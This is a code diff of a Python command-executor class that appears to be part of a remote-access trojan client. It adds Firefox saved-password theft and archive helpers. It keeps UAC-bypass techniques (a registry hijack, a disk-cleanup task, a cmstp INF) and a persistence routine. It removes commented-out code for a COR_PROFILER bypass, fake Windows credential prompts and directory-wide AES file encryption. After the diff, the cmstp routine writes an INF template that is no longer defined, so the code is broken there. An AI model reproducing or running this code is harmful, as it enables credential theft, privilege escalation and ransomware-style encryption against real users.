@@ -5,7 +5,6 @@ import json
 import os
 import subprocess
 import time
-from pathlib import Path
 
 from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
 from common.util import logger, get_time, format_dict, parse
@@ -165,10 +164,6 @@ class CommandExecutor:
     @enclosing
     def persist(self, args):
 
-        @desc('test shell')
-        def testshell(option):
-            return self.shell(option)
-
         @desc('create registry key')
         def registry(option):
             import winreg
@@ -259,6 +254,13 @@ class CommandExecutor:
     @params('browser', 'type')
     def browser(self, this, args):
         home = os.path.expanduser('~')
+        if this.browser == 'firefox':
+            if this.type == 'password':
+                profile_path = os.path.join(home, r'AppData\Roaming\Mozilla\Firefox\Profiles')
+                return get_firefox_password(profile_path)
+            else:
+                return 0, 'No supported: {}'.format(this.type)
+
         profile_paths = {
             'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
             'edge': os.path.join(home, r'AppData\Local\Microsoft\Edge\User Data'),
@@ -285,13 +287,34 @@ class CommandExecutor:
         else:
             return 0, 'Error: {}'.format(this.type)
 
-"""
-class Command:
+    @desc('create a zip archive')
+    def zip(self, dir_name):
+        import pathlib
+        import shutil
+        import tempfile
+        tempdir = tempfile.mkdtemp()
+        dir_name = os.path.abspath(dir_name)
+        if not os.path.isdir(dir_name):
+            return 0, f'Directory does not exist: {dir_name}'
+        zip_name = os.path.basename(dir_name)
+        pardir = pathlib.Path(dir_name).resolve().parent
+        filename = shutil.make_archive(os.path.join(tempdir, zip_name), format='zip', root_dir=pardir,
+                                       base_dir=os.path.basename(dir_name))
+        return 1, f'Archive created: {filename}'
 
-    @staticmethod
+    @desc('extract files from a zip archive')
+    def unzip(self, zip_name):
+        import shutil
+        zip_name = os.path.abspath(zip_name)
+        if not os.path.isfile(zip_name):
+            return 0, f'File does not exist: {zip_name}'
+        shutil.unpack_archive(zip_name, os.getcwd())
+        return 1, f'Archive extracted to {os.getcwd()}'
+
     @desc('elevate as admin without uac prompt')
     @enclosing
-    def uac(args):
+    def uac(self, args):
+
         @desc('ask for elevation')
         @require_integrity('Medium')
         def ask():
@@ -316,31 +339,7 @@ class Command:
             winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
             winreg.DeleteValue(key, 'DelegateExecute')
             winreg.CloseKey(key)
-            return 1, 'success'
-
-        @desc('.net profiler dll')
-        @require_integrity('Medium')
-        def clr():
-            import winreg
-            dll_path = os.path.abspath(rf'external\{Path(EXECUTABLE_PATH).stem}.dll')
-            if not os.path.isfile(dll_path):
-                return 0, f'File does not exist: {dll_path}'
-            reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
-            winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
-            winreg.CloseKey(key)
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
-            winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
-            winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
-            winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
-            p = subprocess.Popen('mmc eventvwr.msc', shell=True)
-            p.communicate()
-            winreg.DeleteValue(key, 'COR_PROFILER')
-            winreg.DeleteValue(key, 'COR_PROFILER_PATH')
-            winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
-            winreg.CloseKey(key)
-            return 1, 'success'
+            return 1, 'Success'
 
         @desc('disk cleanup scheduled task')
         @require_integrity('Medium')
@@ -352,30 +351,13 @@ class Command:
             p.communicate()
             winreg.DeleteValue(key, 'windir')
             winreg.CloseKey(key)
-            return 1, 'success'
+            return 1, 'Success'
 
         @desc('install inf file')
         @require_integrity('Medium')
         def cmstp():
             import tempfile
-            inf_template = r'''
-[version]
-Signature=$chicago$
-AdvancedINF=2.5
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
-[RunPreSetupCommandsSection]
-{}
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
-[AllUSer_LDIDSection]
-"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
-[Strings]
-ServiceName="flcVPN"
-ShortSvcName="flcVPN"
-            '''.format(EXECUTABLE_PATH)
-            inf_path = os.path.join(tempfile.gettempdir(), 'tmp.inf')
+            inf_path = os.path.join(tempfile.gettempdir(), 'flcVPN.inf')
             with open(inf_path, 'w') as f:
                 f.write(inf_template)
             p = subprocess.Popen(r'C:\Windows\System32\cmstp.exe "{}" /au'.format(inf_path))
@@ -390,135 +372,6 @@ ShortSvcName="flcVPN"
             time.sleep(5)
             psutil.Process(p.pid).kill()
             os.remove(inf_path)
-            return 1, 'success'
+            return 1, 'Success'
 
         return locals()
-
-    @staticmethod
-    @desc('prompt for credentials')
-    @enclosing
-    def cred(args):
-
-        @desc('PSHostUserInterface.PromptForCredential')
-        def pshostui(option):
-            command = r'$cred=$Host.UI.PromptForCredential($null,$null,$env:username,$null);' \
-                      'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} ' \
-                      'else {echo `n} '
-            if option == '--create-desktop':
-                try:
-                    create_desktop()
-                    while 1:
-                        status, result = create_process(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
-                                                        f' {command}')
-                        if not status:
-                            raise Exception(result)
-                        lines = result.splitlines()
-                        if logon_user(*lines):
-                            switch_default()
-                            return 1, str(lines)
-                except:
-                    switch_default()
-                    raise
-            else:
-                while True:
-                    p = subprocess.Popen(f'powershell.exe {command}', stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                         shell=True)
-                    stdout, stderr = p.communicate()
-                    if stderr:
-                        return 0, stderr.decode(locale.getdefaultlocale()[1])
-                    lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
-                    if logon_user(*lines):
-                        return 1, str(lines)
-
-        @desc('Windows.Security.Credentials.UI.CredentialPicker')
-        def credpicker():
-            filename = os.path.abspath(r'external\Cred.ps1')
-            if not os.path.isfile(filename):
-                return 0, f'File does not exist: {filename}'
-            p = subprocess.Popen(rf'powershell.exe -ep bypass -file "{filename}"', stdout=subprocess.PIPE,
-                                 stderr=subprocess.PIPE, shell=True)
-            stdout, stderr = p.communicate()
-            if stderr:
-                return 0, stderr.decode(locale.getdefaultlocale()[1])
-            lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
-            return 1, str(lines)
-
-        return locals()
-
-    @staticmethod
-    @desc('encrypt and decrypt files')
-    @enclosing
-    def aes(args):
-
-        @desc('key generation')
-        def gen():
-            import base64
-            from Crypto.Random import get_random_bytes
-            return 1, base64.b64encode(get_random_bytes(32)).decode()
-
-        @params(['key', 'path'])
-        @desc('encryption')
-        def enc(this, arg):
-            import base64
-            key = base64.b64decode(this.key)
-            if os.path.isfile(this.path):
-                encrypt_file(this.path, key)
-                return 1, 'success'
-            elif os.path.isdir(this.path):
-                result = []
-                for root, subdirs, files in os.walk(this.path):
-                    for filename in files:
-                        try:
-                            encrypt_file(os.path.join(root, filename), key)
-                        except Exception as e:
-                            result.append(str(e))
-                return 1, '\n'.join(result)
-            else:
-                return 0, 'No such file or directory'
-
-        @params(['key', 'path'])
-        @desc('decryption')
-        def dec(this, arg):
-            import base64
-            key = base64.b64decode(this.key)
-            if os.path.isfile(this.path):
-                decrypt_file(this.path, key)
-                return 1, 'success'
-            elif os.path.isdir(this.path):
-                result = []
-                for root, subdirs, files in os.walk(this.path):
-                    for filename in files:
-                        try:
-                            decrypt_file(os.path.join(root, filename), key)
-                        except Exception as e:
-                            result.append(str(e))
-                return 1, '\n'.join(result)
-            else:
-                return 0, 'No such file or directory'
-
-        return locals()
-
-    @staticmethod
-    @desc('create a zip archive')
-    def zip(dir_name):
-        import pathlib, shutil
-        dir_name = os.path.abspath(dir_name)
-        if not os.path.isdir(dir_name):
-            return 0, f'Directory does not exist: {dir_name}'
-        zip_name = os.path.basename(dir_name)
-        pardir = pathlib.Path(dir_name).resolve().parent
-        if dir_name == os.getcwd():
-            zip_name = os.path.join('../..', zip_name)
-        filename = shutil.make_archive(zip_name, format='zip', root_dir=pardir, base_dir=os.path.basename(dir_name))
-        return 1, f'Archive created: {filename}'
-
-    @staticmethod
-    @desc('extract files from a zip archive')
-    def unzip(zip_name):
-        import shutil
-        zip_name = os.path.abspath(zip_name)
-        if not os.path.isfile(zip_name):
-            return 0, f'File does not exist: {zip_name}'
-        shutil.unpack_archive(zip_name, os.getcwd())
-        return 1, f'Archive extracted to {os.getcwd()}'
-"""
